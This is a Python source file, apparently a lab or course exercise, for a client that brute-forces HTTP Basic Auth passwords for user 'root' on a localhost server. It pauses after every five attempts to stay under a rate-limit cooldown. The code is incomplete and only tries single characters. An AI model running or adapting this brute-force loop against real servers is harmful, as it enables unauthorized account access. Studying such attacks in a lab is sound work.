from const import *
import base64
import socket
import itertools
import selectors
import random
import time

class zerg:
    def __init__(self, name: str = ""):
        #self.sel = selectors.DefaultSelector()
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.name = name
        self.HOST = "localhost" #"host.docker.internal"
        self.PORT = 8000
        self.alive = True
        self.pws_tried = []
        self.connect()
        self.msg_buffer=""
        self.c=0

    def gen_pw(self,len :int):
        pass


    def connect(self):
        """Connect to chat server and setup stdin flags."""
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((self.HOST, self.PORT))

    def try_pw(self,pw :str):
        """Creates the AuthHeader with the created pw""" #password, not powerword - a priest would help here though
        ID = "root"

        authHead = ID+":"+pw
        authHeadB64 = base64.b64encode(authHead.encode()).decode()

        httpHeader = f'''GET / HTTP/1.1\nHost: localhost\nAuthorization: Basic {authHeadB64}\n\n'''  #internet says to use carriage return but not sure why
        
        print("testing pw:",pw)
        msg = httpHeader
        self.send_msg(msg)
            
    def send_msg(self,msg):
        encoded_msg=str(msg).encode("utf-8")                   

        self.s.send(encoded_msg)
        self.server_response()
        #block waiting for a response
        # poor client, is anxious :(
        
    def server_response(self):
        #big buffer >:)
        incoming = self.s.recv(100).decode("ascii")

        #add newly received contents to already existing buffer
        self.msg_buffer=self.msg_buffer+incoming
        recv_msgs=[]

        # Check if we got a complete message in the buffer waiting for us
        if "\r\n\r\n" in self.msg_buffer:
            tmp=self.msg_buffer.split("\r\n\r\n")
            #print("got",len(tmp),"msgs here")

            #Get all the messages except the last (it may be complete but probably not. Leave it in buffer for next round)
            if len(tmp)>1:
                for i in range(0,len(tmp)-1):
                    recv_msgs.append(tmp[i])
                    self.c+=1
                #only the remains stay in the buffer.
                self.msg_buffer=tmp[len(tmp)-1]

        for el in recv_msgs:
            print("DEBUG: response :\n",el.split("\n")[0]," \nas message number",self.c)
            #maybe calculate the average size of all responses and then if we get a larger one, success? :D


    def loop(self):
        #main loop
        while self.alive:
            print("all your base are belong to us") #nice ref :D
            
            chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPKRSTUVWXYZ"

            n = 1
            count = 0
            for i in range(1, n+1):
                for item in itertools.product(chars, repeat=i):
                    self.try_pw(item[0])
                    count+=1
                    if count >4: #target->5
                        #To clear out the received messages even if we're waiting for the cooldown to reset
                        if "\r\n\r\n" in self.msg_buffer:
                            self.server_response()
                        time.sleep(COOLDOWN_TIME/100)
                        count = 0
                        self.connect()
            
slave = zerg("joao")
slave.loop()
            
            